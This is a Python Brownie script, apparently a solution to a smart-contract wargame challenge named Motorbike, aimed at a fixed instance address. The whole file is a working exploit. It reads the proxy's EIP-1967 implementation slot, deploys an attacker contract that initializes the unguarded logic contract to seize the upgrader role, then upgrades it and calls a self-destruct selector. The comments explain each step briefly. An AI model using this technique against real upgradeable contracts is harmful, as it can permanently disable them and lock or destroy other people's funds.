from brownie import Motorbike, Engine, Exploit, Contract, accounts, web3

INSTANCE_ADDRESS = "0x2E5b40f6f9C8622480574992F09767C4855b5B06"
ACCOUNT = "straul"


def get_account():
    return accounts.load(ACCOUNT)


def crack_engine(account):
    # find the address of the logic contract
    # keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    engine_address_raw = web3.eth.getStorageAt(INSTANCE_ADDRESS,
                          0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)
    engine_address = web3.toHex(engine_address_raw[12:])

    # deploy exploit and call initialize in logic contract
    # this will update the upgrader to the exploiter contract
    exploit = Exploit.deploy(engine_address, {'from': account})

    # upgrade implementation and call destroy in exploiter contract
    exploit.kill_logic(exploit.address, "0x83197ef000000000000000000000000000000000000000000000000000000000",
                       {'from': account})


def main():
    account = get_account()
    crack_engine(account)
